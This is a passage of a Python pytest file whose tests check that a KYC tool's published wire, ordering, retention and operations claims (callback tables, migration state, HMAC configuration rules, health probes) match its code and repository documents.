        LedgerState(seen_run_ids=frozenset({"B"}), current_source="automatic"),
        Callback("c", "A"), phase=INTERIM)
    assert late_older.record and not late_older.effective

    manual_current = decide(
        LedgerState(current_source="manual", high_water=5),
        Callback("c", "r", decision_sequence=6), phase=POST_024)
    assert not manual_current.effective and manual_current.advance_high_water


@verifies("WIRE.CALLBACK.LEGEND")
def _the_condition_legend_is_closed_and_cross_bound():
    """Gate audit `6c4f54a..91fbde3` finding 3: the per-value phrases used to be an authority
    nothing pinned, so swapping the manual and automatic meanings derived conditions normally and
    reversed what the page said. The legend is now one claim: its token set must equal the
    machines' closed domains exactly, and each paired meaning must carry its own token's
    distinguishing term and never its sibling's — the swap is a failing mutation."""
    from docs.contracts import predicates

    legend = dict(WIRE.value("WIRE.CALLBACK.LEGEND"))
    assert legend == predicates.legend(), (
        "the claim and the typed-semantics derivation drifted apart"
    )
    # re-audit finding 8: every token's executable checker, held to the machines themselves
    from docs.contracts.receiver_reference import token_semantics_problems

    assert token_semantics_problems() == []
    # ...and the derived meanings carry a reviewed pin: a paraphrase is a re-pin, the act of
    # review — keyword presence proved nothing (the deceptive-paraphrase specimen kept every
    # expected word while reversing the semantics)
    legend_digest = hashlib.sha256(
        "\0".join(f"{t}={m}" for t, m in sorted(legend.items())).encode()
    ).hexdigest()[:16]
    assert legend_digest == "44590df7364f002d", (
        f"the legend meanings changed since review: now {legend_digest}. Read every meaning, "
        "then re-pin in the SAME commit."
    )
    expected_tokens = (
        predicates.DUPLICATE_DOMAIN | predicates.SOURCE_DOMAIN | predicates.SEQUENCE_DOMAIN
        | predicates.BINDING_DOMAIN | predicates.EVENT_DOMAIN | predicates.DEADLINE_DOMAIN
    )
    assert set(legend) == expected_tokens, (
        f"legend tokens {sorted(set(legend) ^ expected_tokens)} out of step with the domains"
    )
    for token, meaning in legend.items():
        assert meaning.strip(), f"{token}: empty meaning"
    # paired exclusivity: (token, its distinguishing term, sibling, sibling's term)
    pairs = (
        (predicates.SRC_MANUAL, "manual approval", predicates.SRC_AUTOMATIC, "automatic"),
        (predicates.DUP, "already", predicates.FRESH, "new"),
        (predicates.SEQ_ABOVE, "exceeds", predicates.SEQ_NOT_ABOVE, "at or below"),
        (predicates.EVENT_UNCHANGED, "still the one", predicates.EVENT_CHANGED, "no longer"),
        (predicates.DEADLINE_LIVE, "before", predicates.DEADLINE_EXPIRED, "reached"),
        (predicates.BIND_MATCH, "pending release", predicates.BIND_MISMATCH, "different release"),
    )
    for token, term, sibling, sibling_term in pairs:
        assert term in legend[token], f"{token}: meaning lost its distinguishing term {term!r}"
        assert term not in legend[sibling], (
            f"{sibling}: meaning carries {token}'s distinguishing term {term!r} — the swap"
        )
        assert sibling_term in legend[sibling], (
            f"{sibling}: meaning lost its distinguishing term {sibling_term!r}"
        )
        assert sibling_term not in legend[token], (
            f"{token}: meaning carries {sibling}'s distinguishing term {sibling_term!r} — the swap"
        )


@verifies("WIRE.CALLBACK.RELEASE")
def _the_release_table_is_total_and_held_to_its_own_oracle():
    """Gate audit `6c4f54a..91fbde3` finding 1, plus the finding-2 oracle discipline for the new
    machine from day one: the rows partition all 72 release-pending states, exactly ONE row
    completes, every row and every executed decision matches an oracle restating the accepted
    completion CAS, and the rendered conditions parse back."""
    from docs.contracts import predicates
    from docs.contracts import receiver_reference as rr
    from docs.contracts.wire import POST_024, RELEASE_TRANSITIONS

    claim = WIRE["WIRE.CALLBACK.RELEASE"]
    assert claim.state is ClaimState.PENDING, (
        "the release protocol arrives with 024; publishing it as exercisable is finding 13's "
        "free-prose defect in table form"
    )
    rows = claim.value
    assert rows is RELEASE_TRANSITIONS
    problems = predicates.release_partition_problems(rows)
    assert not problems, problems
    assert sum(1 for r in rows if r.completes_release) == 1, (
        "exactly one row may complete the release"
    )

    def oracle(observed):
        """(records, effective, advances, completes) from the accepted invariants: manual stays
        effective; the mark moves on proven order; completion requires EVERY CAS check."""
        if observed["duplicate"] == predicates.DUP:
            return (False, False, False, False)
        completes = (
            observed["binding"] == predicates.BIND_MATCH
            and observed["manual_event"] == predicates.EVENT_UNCHANGED
            and observed["deadline"] == predicates.DEADLINE_LIVE
            and observed["sequence"] == predicates.SEQ_ABOVE
        )
        advances = observed["sequence"] == predicates.SEQ_ABOVE
        return (True, completes, advances, completes)

    for observed in predicates.release_state_space():
        (index,) = [i for i, r in enumerate(rows) if r.when.matches(observed)]
        row = rows[index]
        assert (row.records, row.becomes_effective, row.advances_high_water,
                row.completes_release) == oracle(observed), (
            f"{observed}: the published release row disagrees with the invariant oracle"
        )

    def realize(observed):
        run_id = "r-seen" if observed["duplicate"] == predicates.DUP else "r-new"
        current_event = ("M1" if observed["manual_event"] == predicates.EVENT_UNCHANGED
                         else "M2")
        binding = {
            predicates.BIND_NONE: (None, None),
            predicates.BIND_MATCH: ("R1", "M1"),
            predicates.BIND_MISMATCH: ("R-other", "M1"),
        }[observed["binding"]]
        sequence = {predicates.SEQ_ABSENT: None, predicates.SEQ_NOT_ABOVE: 3,
                    predicates.SEQ_ABOVE: 9}[observed["sequence"]]
        now = 500 if observed["deadline"] == predicates.DEADLINE_LIVE else 1000
        state = rr.LedgerState(
            seen_run_ids=frozenset({"r-seen"}),
            current_source="manual_release_pending",
            high_water=5,
            current_manual_event_id=current_event,
            release=rr.PendingRelease(release_id="R1", requested_manual_event_id="M1",
                                      deadline=1000),
        )
        callback = rr.Callback(case_id="c", run_id=run_id, decision_sequence=sequence,
                               release_id=binding[0], manual_event_id=binding[1])
        return state, callback, now

    for observed in predicates.release_state_space():
        state, callback, now = realize(observed)
        outcome = rr.decide(state, callback, phase=POST_024, now=now)
        assert (outcome.record, outcome.effective, outcome.advance_high_water,
                outcome.completes_release) == oracle(observed), (
            f"{observed}: the executed release decision disagrees with the invariant oracle"
        )

    for row in rows:
        assert row.condition == row.when.condition()
        assert predicates.parse_release_condition(row.condition) == row.when
        kind = wire_module.OUTCOME_KINDS[row.outcome]
        assert row.record == kind.record_text and row.effective == kind.effective_text
        assert row.why == wire_module.REASON_TEXTS[row.reason]
        assert (row.records, row.becomes_effective, row.advances_high_water,
                row.completes_release) == (
            kind.records, kind.becomes_effective, kind.advances_high_water,
            kind.completes_release)

    # the machine's non-callback transitions, executed: cancellation and the interim hold
    cancelled = rr.apply_manual_approval(
        realize(next(iter(predicates.release_state_space())))[0], manual_event_id="M9")
    assert cancelled.release is None and cancelled.current_source == "manual"
    with pytest.raises(rr.UnknownSourceError):
        rr.decide(realize(next(iter(predicates.release_state_space())))[0],
                  rr.Callback(case_id="c", run_id="r-x"), phase="interim")

    # consistent with the interim ordering rule, which is the same rule stated for sorting
    assert "manual approval" in WIRE.value("WIRE.ORDERING.INTERIM").lower()


@verifies("WIRE.CALLBACK.WAIT_BOUND")
def _wait_bound_says_detach_not_cancel():
    """The publisher cannot retract an in-flight request; calling the wall a cancellation would
    let the receiver assume a timed-out attempt never landed."""
    text = WIRE.value("WIRE.CALLBACK.WAIT_BOUND").lower()
    assert "stop waiting" in text and "detach" in text
    assert "may still reach you" in text
    assert "cancel" not in text


@verifies("WIRE.CALLBACK.COMPLETION")
def _completion_claim_lists_every_case_that_sends_nothing():
    """'The callback is your completion signal' is true only for an automated decision that
    produces an eligible callback. Each exception below is a case where waiting for one hangs
    forever, so each must be named."""
    text = WIRE.value("WIRE.CALLBACK.COMPLETION").lower()
    assert "not a universal completion signal" in text
    assert "manual approval" in text and "no callback at all" in text
    assert "suppressed" in text and "never sent" in text
    assert "dead-lettered" in text and "was sent" in text


# ── ordering ──────────────────────────────────────────────────────────────────────────────────────
@verifies("WIRE.ORDERING.NO_DECIDED_AT")
def _decided_at_prohibition_still_has_repo_authority():
    """If the recorded prohibition is ever removed from the repo, this claim's authority is gone
    and the document must not keep asserting it."""
    runbook = (REPO / "docs" / "RUNBOOK.md").read_text()
    findings = (REPO / "AUDIT_FINDINGS.md").read_text()
    assert "fall back to" in runbook and "decided_at" in runbook
    assert "decided_at` is transaction-start time" in findings
    claim = WIRE.value("WIRE.ORDERING.NO_DECIDED_AT").lower()
    assert "not an ordering key" in claim and "transaction-start" in claim


@verifies("WIRE.ORDERING.INTERIM")
def _interim_rule_makes_a_manual_approval_authoritative():
    text = WIRE.value("WIRE.ORDERING.INTERIM").lower()
    assert "(case_id, run_id)" in text
    assert "manual approval" in text and "authoritative" in text
    assert "can arrive after it" in text


def _alembic_script(config_path=None, script_location=None) -> ScriptDirectory:
    """Alembic's own view of the revision graph, not a directory glob.

    The previous guard globbed `REPO/migrations/versions` — a path this repo does not have, since
    it uses `alembic/versions` (re-audit `4c3015a..cccd5f7` F12). The set was therefore always
    empty and the staleness assertion was vacuously true from the day it was written: adding a real
    `024_*.py` left the PENDING verifier green. Reading through `ScriptDirectory` means a layout
    change cannot silently disarm the guard, and it sees branch structure a glob cannot.

    Gate finding 5: this used to overwrite `script_location` UNCONDITIONALLY with `REPO/alembic`,
    which substitutes a convention for the configuration. An `alembic.ini` pointing at a different
    tree that contains 024 passed while the stale `./alembic` ended at 023 — the guard was watching
    a directory Alembic would not have used. The production path now takes the configured value
    verbatim; an explicit location is a TEST-FIXTURE injection only.
    """
    cfg = Config(str(config_path or (REPO / "alembic.ini")))
    if script_location is not None:
        cfg.set_main_option("script_location", str(script_location))
    # `script_location` in the repo config is RELATIVE, so resolve it against the config's own
    # directory rather than the process cwd — a cwd-dependent helper would pass or fail by accident.
    declared = cfg.get_main_option("script_location")
    if declared and not Path(declared).is_absolute():
        base = Path(config_path or (REPO / "alembic.ini")).parent
        cfg.set_main_option("script_location", str((base / declared).resolve()))
    return ScriptDirectory.from_config(cfg)


def assert_024_unbuilt(script: ScriptDirectory, callback_model) -> None:
    """PENDING means 024 exists in NEITHER authority, and the two must agree.

    A claim that publishes requirements instead of a schema is only honest while the thing is
    genuinely unbuilt, and 024 can become half-built from either side: the migration that installs
    the ordering schema, or `decision_sequence` on the callback — the post-024 ordering authority
    per ROADMAP D1. Checking one lets the other land silently, so both are checked and either alone
    is a failure. A field without its revision is not "nearly pending"; it is an undeclared partial
    build that an integrator could discover in the wire before the document admits it exists.
    """
    heads = script.get_heads()
    assert len(heads) == 1, (
        f"the revision graph has {len(heads)} heads ({sorted(heads)}). 024 landing on a branch is "
        "exactly how it arrives without moving the single head this claim is checked against."
    )
    revisions = {revision.revision for revision in script.walk_revisions()}
    built = sorted(r for r in revisions if r.startswith("024"))
    assert not built, f"revision(s) {built} exist; WIRE.ORDERING.BOOTSTRAP_024 is stale"

    fields = set(getattr(callback_model, "model_fields", {}))
    assert "decision_sequence" not in fields, (
        "the callback model publishes `decision_sequence` — the post-024 ordering authority — "
        "while the claim still says 024 is NOT BUILT. Either the revision is missing and the wire "
        "is ahead of the schema, or the claim is stale; both are failures."
    )

    # EXECUTE the encoder rather than reading a declaration (gate finding 6). Inspecting
    # `DecisionCallback.model_fields` alone watched a model the publisher did not use: it built a
    # plain dict, so adding `decision_sequence` to the emitter put the post-024 ordering key on the
    # wire with this verifier green. The encoder is now the single path to the outbox, so running
    # it against a body that TRIES to carry the key is a statement about what can actually be
    # published, not about what somebody declared.
    # The PUBLISHER's active value against the pre-024 LITERAL held in THIS verifier
    # (re-gate-3 finding 4). Comparing it to a sibling alias in the publisher's own module let the
    # natural two-line edit — move the alias and the active value together — pass while every
    # persisted attempt advertised sequenced wire. The verifier's literal does not move with the
    # module it checks; the vocabulary itself is pinned independently by ck_attempt_wire_vocab.
    assert publisher._WIRE_VERSION == "legacy", (
        f"the publisher advertises {publisher._WIRE_VERSION!r} wire while the claim says 024 is "
        "NOT BUILT"
    )
    # REFUSED, not dropped (re-gate finding 3). Silently discarding an unmodelled field made the
    # same key vanish on one path and leak on another; a post-024 ordering key arriving before 024
    # exists is a defect to surface.
    try:
        emitted = schemas.encode_decision_callback(_sequenced_callback_attempt())
    except Exception:
        emitted = None
    assert emitted is None, (
        "the publisher's own encoder accepted `decision_sequence` while 024 is unbuilt"
    )


@verifies("WIRE.ORDERING.BOOTSTRAP_024")
def _bootstrap_is_pending_and_publishes_no_schema():
    """024 is designed but unbuilt. The document must publish requirements, never a draft schema
    an integrator could implement."""
    claim = WIRE["WIRE.ORDERING.BOOTSTRAP_024"]
    assert claim.state is ClaimState.PENDING
    assert "NOT BUILT" in claim.value
    # ...and the REQUIREMENTS survive. Reducing the claim to the bare marker deleted everything an
    # integrator needs in order to answer, while still passing every check (re-audit F3).
    for requirement in ("accepted-run ledger", "manual approval", "two-sided coverage",
                        "response digests", "signed response envelope"):
        assert requirement in claim.value, f"the 024 requirements no longer mention {requirement!r}"
    for schema_ish in ("{", "}", "schema_version", "latest_run_id", "high_water_run_id"):
        assert schema_ish not in claim.value, "the pending claim is publishing a schema again"
    assert_024_unbuilt(_alembic_script(), DecisionCallback)


@verifies("WIRE.ORDERING.SEQUENCE_DOMAINS")
def _the_two_sequence_domains_match_D1_and_the_activation_spec():
    """Static parity across D1, the ROADMAP rows, the activation spec, and what we publish.

    Re-audit `4f23f23..122cc67` finding 1. The published post-024 rule ordered on
    `event_sequence`, which ROADMAP D1 assigns to PR 2 as ingest provenance; the callback-order
    authority is PR 7b's `decision_sequence`. The two invert whenever work completes out of
    admission order, so a receiver built on the wrong one suppresses the LATER decision — and
    both are monotonic per case, so it looks correct until two runs overlap.
    """
    roadmap = re.sub(r"\s+", " ", (REPO / ".agents" / "ROADMAP.md").read_text())
    assert "PR 2 → **`event_sequence`**" in roadmap
    assert "PR 7b → **`decision_sequence`**" in roadmap

    spec = (REPO / ".agents" / "superpowers" / "specs"
            / "2026-07-22-pr7b-activation-platform-ordering-design.md").read_text()
    assert "`decision_sequence` **on the wire**" in spec
    assert "decision_sequence" in spec.split("Wire emission")[1][:400]

    lines = WIRE.value("WIRE.ORDERING.SEQUENCE_DOMAINS")
    provenance = next(line for line in lines if line.startswith("event_sequence"))
    authority = next(line for line in lines if line.startswith("decision_sequence"))
    assert "INGEST PROVENANCE" in provenance and "NEVER an ordering authority" in provenance
    assert "CALLBACK-ORDER AUTHORITY" in authority
    assert "high-water mark" in authority and "decision_sequence and nothing else" in authority

    # event_sequence really is on the wire today, and decision_sequence really is not yet
    from kyc_tool.api.schemas import DecisionCallback

    assert "event_sequence" in DecisionCallback.model_fields
    assert "decision_sequence" not in DecisionCallback.model_fields, (
        "decision_sequence now ships; the claim must stop saying it arrives with 024"
    )
    assert "arrives with the activation unit" in " ".join(lines) or "with the activation unit" in authority

    # and the transition table orders on the authority, not the provenance
    post = [t for t in WIRE.value("WIRE.CALLBACK.EFFECTIVENESS") if t.phase == "post-024"]
    ordering_rows = " ".join(t.condition + " " + t.record for t in post)
    assert "decision_sequence" in ordering_rows
    assert "event_sequence" not in ordering_rows, (
        "the post-024 rows order on ingest provenance again"
    )


@verifies("WIRE.ORDERING.PENDING_INPUTS")
def _pending_024_inputs_cover_every_live_obligation():
    """One-to-one against the obligation ids PARSED FROM THE LIVE SPEC.

    Re-audit `4f23f23..97deeae` finding 10. The document asked three questions TechCraft could
    answer completely while 024 stayed non-buildable, because O1-O4 need decisions only the
    platform can make. Parsing the spec rather than hardcoding the ids means a fifth obligation
    appearing there fails this test until the document asks for it too.
    """
    spec = (REPO / ".agents" / "superpowers" / "specs"
            / "2026-07-22-pr7b-activation-platform-ordering-design.md").read_text()
    live = spec[spec.index("## Open blockers"):]
    live = live[: live.index("\n## ", 1)] if "\n## " in live[1:] else live
    obligations = _live_obligation_ids(live)
    assert obligations == ["O1", "O2", "O3", "O4"], (
        f"the live obligation list changed: {obligations}"
    )

    inputs = WIRE.value("WIRE.ORDERING.PENDING_INPUTS")
    covered = {i.obligation for i in inputs}
    assert covered == set(obligations), (
        f"uncovered obligations {sorted(set(obligations) - covered)}; "
        f"inputs naming nothing live {sorted(covered - set(obligations))}"
    )
    for item in inputs:
        assert item.owner in {"TechCraft", "IPv4.Global", "both"}, item.owner
        # EVERY input carries an executable acceptance test, and it actually rejects the answers
        # that look complete while leaving 024 unsafe (re-audit `4f23f23..122cc67` finding 10):
        # a v1 signature, a local clock, a per-case release id, a writer matrix missing the
        # inline manual approve. `answer_type` describes a shape; only this decides.
        assert callable(item.accept), f"{item.obligation}: no executable acceptance test"
        assert item.must_reject, f"{item.obligation}: names no unusable answer"
        for label, answer in item.must_reject:
            reasons = item.accept(answer)
            assert reasons, f"{item.obligation}: {label} was accepted"
            assert all(isinstance(r, str) and r for r in reasons)
        # every input must ASK something: a question mark, or an explicit request to confirm
        assert "?" in item.question or item.question.startswith(("Confirm", "Agree")), (
            f"{item.obligation}: this input asks nothing")
        assert item.answer_type.strip() and item.authority.strip()
        assert item.blocked_deliverable.strip()
        assert item.obligation in item.authority, (
            f"{item.obligation}: the authority reference does not name its own obligation"
        )
    # no duplicate question under one obligation
    questions = [(i.obligation, i.question) for i in inputs]
    assert len(questions) == len(set(questions))
    assert WIRE["WIRE.ORDERING.PENDING_INPUTS"].state is ClaimState.PENDING

    # a good answer to each one SCREENS clean, so the screens are not simply refusing everything
    from docs.contracts.wire import REQUIRED_WRITER_ROLES

    good = {
        ("O1", "principal"): {"principal": "platform-svc", "hmac_version": "v2", "key_id": "k1"},
        ("O1", "deadline"): {"clock": "platform db", "ttl_seconds": 900},
        ("O2", ""): {"terminal_authority": "platform", "reaper_cadence_seconds": 60,
                     "outcome_recovery": "signed redelivery with replay on restart"},
        ("O3", ""): {"scope": "global", "allocated_by": "platform"},
        ("O4", ""): {"writer_roles": tuple(REQUIRED_WRITER_ROLES), "old_image_full_stop": True,
                     "process_roles": {"api": "writer", "pipeline_worker": "writer",
                                       "outbox_worker": "writer", "retention": "non-writer",
                                       "dev_worker": "writer"}},
    }
    for item in inputs:
        answers = [a for (obligation, _hint), a in good.items() if obligation == item.obligation]
        assert any(item.accept(answer) == [] for answer in answers), (
            f"{item.obligation}: no screenable answer exists, so the screen refuses everything"
        )

    # the specific decisions the finding said were missing
    text = " ".join(i.question for i in inputs)
    for missing in ("principal", "HMAC VERSION", "deadline", "SOLE terminal", "reaper",
                    "GLOBALLY unique", "WRITER-ROLE MATRIX", "old-image",
                    "EVERY process role"):
        assert missing in text, f"the 024 request still does not ask about {missing!r}"

    # audit `4c3015a..cccd5f7` finding 11, folded fail-closed: screening is not resolution. Every
    # obligation is UNRESOLVABLE — even wrapping the best screenable answer in the most complete
    # artifact shape imaginable — because no versioned answer-artifact schema or verifying
    # authority exists. The refusal must cite that ABSENCE, not the content.
    for item in inputs:
        best_content = next(
            a for (obligation, _h), a in good.items() if obligation == item.obligation)
        artifact = {"schema_version": "1.0.0", "approved_by": "platform release authority",
                    "signature_verified": True, "answer": best_content}
        problems = wire_module.resolution_problems(item, artifact)
        assert problems, f"{item.obligation}: an artifact resolved an obligation"
        assert any("unresolvable" in p for p in problems), problems
    assert wire_module.ANSWER_ARTIFACT_SCHEMA is None, (
        "the answer-artifact schema anchor moved; resolution_problems, the claim note, and "
        "ROADMAP PR 7b-inputs must all move in the same change"
    )
    assert isinstance(wire_module.ANSWER_ARTIFACT_AUTHORITY, wire_module.MissingCapability), (
        "an answer-artifact authority is registered; the claim, the gate, and ROADMAP "
        "PR 7b-inputs must move in the same change"
    )
    assert wire_module.ANSWER_ARTIFACT_AUTHORITY.roadmap_unit == "PR 7b-inputs"
    note = WIRE["WIRE.ORDERING.PENDING_INPUTS"].note
    assert "RESOLVE" in note and "has not shipped" in note, (
        "the published note no longer tells the reader that no reply can resolve an obligation"
    )

    # the accounted role inventory mirrors ProcessRole exactly (the plan.PLAN_ROLES bind, again):
    # a new executable role cannot appear without the O4 matrix demanding a stance on it.
    assert set(wire_module.ACCOUNTED_PROCESS_ROLES) == {role.value for role in ProcessRole}
    assert len(wire_module.ACCOUNTED_PROCESS_ROLES) == len(ProcessRole)

    # the reserved, unbuilt ROADMAP unit for the artifact schema
    row = next((r for r in roadmap.records() if r[0] == "PR 7b-inputs"), None)
    assert row is not None, "ROADMAP §C reserves no PR 7b-inputs unit for the answer artifacts"
    _unit, state, revisions = row
    assert state == "future" and revisions == [], (
        "PR 7b-inputs must stay an explicit `future` reservation without a migration (gate F12)"
    )
    assert not roadmap.future_unit_problems(roadmap.ROADMAP.read_text())


@verifies("WIRE.ORDERING.INTEGRITY_MISMATCH")
def _integrity_mismatch_is_emitted_by_nothing_today():
    """The claim says no code path emits this state yet. Proven structurally: no string CONSTANT
    anywhere in src equals it. A raw substring search would match the prose in outbox/witness.py
    that merely names the future state, and would then keep passing after it started shipping —
    exactly backwards."""
    claim = WIRE["WIRE.ORDERING.INTEGRITY_MISMATCH"]
    assert claim.state is ClaimState.PENDING
    assert "no code path emits it today" in claim.value.lower()
    for path in sorted(SRC.rglob("*.py")):
        for node in ast.walk(ast.parse(path.read_text())):
            if isinstance(node, ast.Constant) and node.value == "integrity_mismatch":
                raise AssertionError(f"{path.relative_to(REPO)} now emits integrity_mismatch")


# ── retention ─────────────────────────────────────────────────────────────────────────────────────
@verifies("WIRE.RETENTION.BY_KIND")
def _retention_claim_matches_the_per_kind_behaviour():
    retention = (SRC / "workers" / "retention.py").read_text()
    documented = dict((kind, text) for kind, text in WIRE.value("WIRE.RETENTION.BY_KIND"))
    assert "redacted in place" in documented["decision callbacks"]
    poc = documented["POC verification emails"]
    assert "DELETED" in poc and "delivered or dead" in poc
    assert "delete" in retention.lower() and "redact" in retention.lower()


@verifies("WIRE.RETENTION.WINDOW_DAYS")
def _retention_window_matches_settings():
    assert WIRE.value("WIRE.RETENTION.WINDOW_DAYS") == Settings().retention_days


# ── operations ────────────────────────────────────────────────────────────────────────────────────
@verifies("OPS.BLOCKER.PRODUCTION_PROVIDERS")
def _the_production_blocker_is_demonstrably_true():
    """The strongest claim in either document, so it is proven by execution rather than by text:
    production refuses stubs, and every non-stub provider factory raises."""
    from kyc_tool.outbox.emails import make_email_sender
    from kyc_tool.workers.pipeline_worker import _make_ocr_engine, build_adapters

    assert OPERATIONS["OPS.BLOCKER.PRODUCTION_PROVIDERS"].state is ClaimState.BLOCKED

    # (a) production refuses the stub values
    for stub in (
        {"ocr_engine": STUB_OCR_ENGINE},
        {"email_provider": STUB_EMAIL_PROVIDER},
        {"adapters_profile": STUB_ADAPTERS_PROFILE},
    ):
        assert production_config_violations(hardened(**stub)), f"{stub} should be refused"

    # (b) and every production-safe value is unimplemented
    with pytest.raises(NotImplementedError):
        _make_ocr_engine("tesseract")
    with pytest.raises(NotImplementedError):
        make_email_sender("ses")
    with pytest.raises(NotImplementedError):
        build_adapters(Settings(adapters_profile="real"), store=None)


@verifies("OPS.PROCESS.COMMANDS")
def _process_commands_reference_real_modules():
    commands = OPERATIONS.value("OPS.PROCESS.COMMANDS")
    for _label, command, _note in commands:
        if command.startswith("python -m "):
            module = command.split()[2]
            path = REPO / "src" / (module.replace(".", "/") + ".py")
            assert path.exists(), f"{command} names a module that does not exist"
    # the guide's heading counts them; a command added without updating it would go unnoticed
    assert len(commands) == 6


@verifies("OPS.PROCESS.DEV_WORKER_BANNED")
def _dev_worker_is_refused_by_the_process_role_authority():
    """Executed, not described: the role gate refuses dev_worker on an OTHERWISE VALID production
    configuration, which is what 'categorically' means."""
    assert not production_config_violations(hardened()), "the fixture is no longer a valid prod config"
    with pytest.raises(ProductionConfigError) as excinfo:
        validate_process_role(hardened(), ProcessRole.DEV_WORKER)
    assert "dev_worker" in str(excinfo.value)
    validate_process_role(hardened(), ProcessRole.OUTBOX_WORKER)  # a production role passes
    # the ban is PRODUCTION-specific, exactly as the claim words it
    validate_process_role(Settings(environment="development"), ProcessRole.DEV_WORKER)


@verifies("OPS.INFRA.COMPONENTS")
def _infrastructure_rows_match_the_settings_that_back_them():
    rows = {
        component: (requirement, why)
        for component, requirement, why in OPERATIONS.value("OPS.INFRA.COMPONENTS")
    }
    settings = Settings()
    assert hasattr(settings, "s3_bucket") and hasattr(settings, "object_store")
    # the namespace split is the load-bearing part of the object-store row
    from kyc_tool.ops.sweep_staged_evidence import STAGED_PREFIX

    assert STAGED_PREFIX.rstrip("/") in rows["Object store"][1]
    assert "uploads/" in rows["Object store"][1]
    # seven years, stated in the backups row, is the retention default in days
    assert round(settings.retention_days / 365.25) == 7
    assert "seven-year" in rows["Backups"][1]
    # the email row must not contradict the blocker
    assert "none is implemented" in rows["Email"][0]


@verifies("OPS.CONFIG.DEFAULTS")
def _config_defaults_match_settings():
    settings = Settings()
    for field, documented in OPERATIONS.value("OPS.CONFIG.DEFAULTS").items():
        assert int(getattr(settings, field)) == documented, f"{field} default moved"


@verifies("OPS.CONFIG.PRODUCTION_FLOORS")
def _production_floors_are_actually_enforced():
    assert any("job_lease_seconds" in v for v in production_config_violations(hardened(job_lease_seconds=29)))
    assert any("ui_admin_token" in v for v in production_config_violations(hardened(ui_admin_token="")))
    assert any(
        "outbox_lease_seconds" in v
        for v in production_config_violations(
            hardened(outbox_lease_seconds=10, outbox_http_timeout_seconds=10)
        )
    )


@verifies("OPS.CONFIG.HMAC_SET")
def _hmac_variable_set_is_complete_and_enforced():
    from kyc_tool.config import _MIN_HMAC_SECRET_LEN

    claim = OPERATIONS["OPS.CONFIG.HMAC_SET"]
    documented = claim.value
    assert len(documented) == len(set(documented)) == 8
    # The NOTE is published advice and is therefore authoritative (re-audit F3): it stated a
    # floor and a date requirement, and nothing compared either to the code, so "at least 8
    # characters" and "dates may be naive" both rendered happily.
    assert f"at least {_MIN_HMAC_SECRET_LEN} characters" in claim.note, claim.note
    assert "timezone-aware ISO-8601" in claim.note
    assert production_config_violations(hardened(hmac_inbound_secret="x" * 8))
    assert production_config_violations(hardened(hmac_v1_inbound_sunset_at="2026-09-01T00:00:00"))
    # dropping any one of the v2 values must produce a violation
    for override in (
        {"hmac_inbound_secret": ""},
        {"hmac_outbound_secret": ""},
        {"hmac_inbound_key_id": ""},
        {"hmac_outbound_key_id": ""},
        {"hmac_v1_inbound_sunset_at": ""},
        {"hmac_v1_outbound_sunset_at": ""},
    ):
        assert production_config_violations(hardened(**override)), override
    # EXACTLY the HMAC settings. "is a real Settings field" was too weak: swapping one entry for
    # KYC_DATABASE_URL passed, because database_url is also a real field (re-audit F3). An
    # operator following that list configures a database URL and omits an authentication secret.
    fields = {name.removeprefix("KYC_").lower() for name in documented}
    expected = {f for f in Settings.model_fields if f.startswith("hmac_")} | {"platform_hmac_secret"}
    expected -= {"hmac_max_skew_seconds", "hmac_inbound_extra_keys"}  # rotation + window are separate claims
    assert fields == expected, f"documented HMAC set drifted: {fields ^ expected}"


@verifies("OPS.CONFIG.ROTATION_KEYS")
def _rotation_key_grammar_is_enforced_at_both_layers():
    """Every refusal the claim promises, executed. The untrimmed-key-id case is the one that
    leaked a working secret into a ValidationError before F1."""
    assert hmac_extra_key_violations({"old": "s" * 32}, "active") == []
    assert hmac_extra_key_violations({}, "active") == []
    for bad in ({"old": "s" * 31}, {"": "s" * 32}, {" padded ": "s" * 32}, {"active": "s" * 32}):
        assert hmac_extra_key_violations(bad, "active"), bad
    assert hmac_extra_key_violations(None, "active"), "a non-mapping must be a violation, not a crash"
    # BOTH layers, which is what the claim promises. Construction refuses outright, so the
    # boundary layer has to be reached through model_copy — the same bypass F2 came in through.
    with pytest.raises(PydanticValidationError):
        hardened(hmac_inbound_extra_keys={"old": "s" * 31})
    smuggled = hardened().model_copy(update={"hmac_inbound_extra_keys": {"old": "s" * 31}})
    assert production_config_violations(smuggled), "the production boundary accepted a weak key"


@verifies("OPS.CONFIG.M2_GATE")
def _m2_gate_matches_the_roadmap():
    # whitespace-normalized: the authoritative phrase wraps across source lines, and a raw
    # substring check would silently pass on its absence rather than its presence
    roadmap = re.sub(r"\s+", " ", (REPO / ".agents" / "ROADMAP.md").read_text())
    claim = OPERATIONS.value("OPS.CONFIG.M2_GATE").lower()
    assert "M4 complete" in roadmap and "staging E2E on real adapters" in roadmap
    for required in ("m4", "staging end-to-end", "real adapters", "platform cutover", "permanent"):
        assert required in claim
    assert "validator hardening" not in claim


@verifies("OPS.HEALTH.PROBES")
def _every_documented_probe_is_a_declared_route():
    declared = _declared_routes()
    for surface, _contract, _action in OPERATIONS.value("OPS.HEALTH.PROBES"):
        for target in surface.removeprefix("GET ").split(" and "):
            assert ("GET", target.strip()) in declared, f"{surface} is not a declared route"


@verifies("OPS.RELEASE.CLASSIFICATION")
def _release_classification_matches_the_release_it_cites():
    """The claim rests on one concrete counterexample: a release with no migration that still took
    a full window. If the cited section stops saying that, the claim has no authority."""
    deployment = re.sub(r"\s+", " ", (REPO / "docs" / "DEPLOYMENT.md").read_text())
    assert "PR 5b cutover — brief full maintenance window" in deployment
    assert "This is not a rolling deploy." in deployment
    adrs = (REPO / "docs" / "architecture-decisions.md").read_text()
    assert "ADR-004 — Review-record binding" in adrs
    claim = OPERATIONS.value("OPS.RELEASE.CLASSIFICATION").lower()
    assert "independently" in claim and "no migration" in claim


def _deployment_section_body(section: str) -> str:
    """The normalized body under a DEPLOYMENT.md heading, up to the next heading."""
    lines = (REPO / "docs" / "DEPLOYMENT.md").read_text().split("\n")
    heads = [(i, ln) for i, ln in enumerate(lines) if re.match(r"^#{1,2} ", ln)]
    matches = [idx for idx, (_i, ln) in enumerate(heads) if section in ln]
    assert len(matches) == 1, f"{section!r} matches {len(matches)} headings; it must match one"
    idx = matches[0]
    start = heads[idx][0]
    end = heads[idx + 1][0] if idx + 1 < len(heads) else len(lines)
    return " ".join("\n".join(lines[start + 1:end]).split())


def _atx_level(line: str) -> int:
    """The ATX heading level of `line` under CommonMark, or 0. Up to THREE leading spaces are
    part of the heading syntax (gate audit `6c4f54a..91fbde3` finding 8): the old scan required
    column-zero hashes, so an indented same-level heading did not bound a section, letting
    content sit inside a reviewed span that a Markdown reader files under a different one.
    Four spaces is an indented code block, never a heading."""
